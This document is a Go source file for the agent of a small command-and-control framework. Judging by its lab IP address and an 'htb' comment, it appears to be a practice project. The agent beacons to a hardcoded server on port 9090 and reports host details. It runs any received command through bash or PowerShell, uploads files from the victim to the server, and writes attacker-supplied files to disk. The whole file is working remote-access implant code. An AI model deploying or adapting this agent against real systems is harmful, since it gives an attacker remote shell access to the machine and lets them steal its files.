package main

import (
	"crypto/md5"
	"d3c/commons/helpers"
	"d3c/commons/structs"
	"encoding/gob"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"time"

	ps "github.com/mitchellh/go-ps"
)

var (
	message    structs.Message
	TimeToWait = 2
)

const (
	SERVER = "10.10.10.134"
	PORT   = "9090"
)

func init() {
	message.AgentHostName, _ = os.Hostname()
	message.AgentCWD, _ = os.Getwd()
	message.AgentId = createAgentId()
}

func main() {
	log.Println("Start AgentID:", message.AgentId)

	for {
		channel := connectServer()
		defer channel.Close()

		// Send message to server
		gob.NewEncoder(channel).Encode(message)
		message.Commands = []structs.Command{}

		// Receive message from server
		gob.NewDecoder(channel).Decode(&message)

		if hasCommand(message) {
			for index, command := range message.Commands {
				message.Commands[index].Response = execCommand(command.Cmd, index)
			}
		}

		time.Sleep(time.Duration(TimeToWait) * time.Second)
	}
}

func execCommand(command string, index int) (response string) {
	commandParts := helpers.SplitCommand(command)
	cmd := commandParts[0]

	// htb -> change sleep time
	switch cmd {
	case "sleep":
		if len(commandParts) > 1 {
			response = setSleep(commandParts[1])
		}
	case "ls":
		response = listFiles()
	case "pwd":
		response = currentDir()
	case "cd":
		if len(commandParts[1]) > 0 {
			response = changeDir(commandParts[1])
		}
	case "whoami":
		response = whoAmi()
	case "ps":
		response = listProcess()
	case "send":
		response = saveFile(message.Commands[index].File)
	case "get":
		response = sendFile(message.Commands[index].Cmd, index)
	default:
		response = exeShellCommand(command)
	}
	return response
}

func setSleep(command string) (response string) {
	var err error
	response = "Sleep set success!"
	TimeToWait, err = strconv.Atoi(command)
	if err != nil {
		response = "Error to define a time to sleep " + err.Error()
	}

	return response
}

func sendFile(command string, index int) (response string) {
	var err error

	response = "File send success!"

	commandParts := helpers.SplitCommand(command)

	message.Commands[index].File.Name = commandParts[1]
	message.Commands[index].File.Content, err = os.ReadFile(commandParts[1])

	if err != nil {
		message.Commands[index].File.Error = true
		response = "Error to get file: " + err.Error()
	} else {
		message.Commands[index].File.Error = false
	}

	return response
}

func saveFile(file structs.File) (response string) {
	response = "File send success!"

	path, _ := os.Getwd()
	name := filepath.Base(file.Name)
	fileName := filepath.Join(path, name)

	var err = os.WriteFile(fileName, file.Content, 0644)
	if err != nil {
		response = "Error saving file " + file.Name + " " + err.Error()
	}
	return response
}

func exeShellCommand(command string) (response string) {
	if runtime.GOOS == "windows" {
		output, _ := exec.Command("powershell.exe", "/C", command).CombinedOutput()
		response = string(output)
	} else if runtime.GOOS == "linux" {
		output, _ := exec.Command("bash", "-c", command).CombinedOutput()
		response = string(output)
	} else {
		response = "Target OS not implemented for shell"
	}
	return response
}

func listProcess() (processes string) {
	listProcesses, _ := ps.Processes()
	for _, p := range listProcesses {
		processes += fmt.Sprintf("%d -> %d -> %s\n", p.PPid(), p.Pid(), p.Executable())
	}
	return processes
}

func whoAmi() (currenName string) {
	user, _ := user.Current()
	currenName = user.Username
	return currenName
}

func changeDir(path string) (response string) {
	err := os.Chdir(path)
	if err != nil {
		response = err.Error()

	}
	return response
}

func currentDir() (currentDir string) {
	currentDir, _ = os.Getwd()
	return currentDir
}

func listFiles() (response string) {
	files, _ := ioutil.ReadDir(currentDir())

	for _, f := range files {
		response += f.Name() + "\n"
	}

	return response
}

func hasCommand(msg structs.Message) (exists bool) {
	exists = false

	if len(msg.Commands) > 0 {
		exists = true
	}

	return exists
}

func createAgentId() string {
	curTime := time.Now().String()
	hasher := md5.New()

	hasher.Write([]byte(message.AgentHostName + curTime))
	return hex.EncodeToString(hasher.Sum(nil))
}

func connectServer() (channel net.Conn) {
	channel, err := net.Dial("tcp", fmt.Sprintf("%s:%s", SERVER, PORT))

	if err != nil {
		log.Printf("Error connecting to server %s:%s\n", SERVER, PORT)
	}
	return channel
}
